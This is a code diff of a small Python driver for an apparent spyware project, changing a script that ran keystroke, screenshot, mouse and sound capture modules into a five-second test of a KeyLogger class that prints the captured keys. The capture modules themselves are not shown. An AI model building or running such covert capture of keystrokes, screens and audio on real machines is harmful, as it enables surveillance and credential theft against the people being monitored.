@@ -1,25 +1,21 @@
 import keylog
-import getImage
-import getSound
-import Mouselogger
+import time
+#import getImage
+#import getSound
+#import Mouselogger
 
 def main():
-    keylog.keylog()
-    print()
-    print("keylog terminé")
-    print()
-    getImage.getImage()
-    print()
-    print("capture prise")
-    print()
-    Mouselogger.mouseLogger()
-    print()
-    print("souris capturée")
-    print()
-    getSound.getSound()
-    print()
-    print("son enregistré")
-    print()
+
+    test_keylog()
+
+
+def test_keylog():
+    klog = keylog.KeyLogger()
+    klog.start()
+    time.sleep(5)
+    klog.stop()
+    print(klog.keys)
+
 
 if __name__ == "__main__":
     main()
